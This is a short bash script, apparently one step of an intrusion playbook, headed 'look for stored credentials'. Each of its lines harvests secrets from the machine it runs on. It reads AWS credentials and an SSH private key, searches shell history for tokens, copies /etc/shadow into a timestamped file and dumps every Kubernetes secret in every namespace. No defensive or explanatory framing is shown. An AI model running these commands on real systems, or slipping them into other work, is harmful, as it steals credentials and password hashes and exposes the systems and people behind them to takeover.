#!/bin/bash
# step 2: look for stored credentials
cat ~/.aws/credentials
cat ~/.ssh/id_rsa
grep -i token ~/.bash_history
sudo cat /etc/shadow > shadow_20261022_090530.txt
kubectl get secrets -A -o yaml
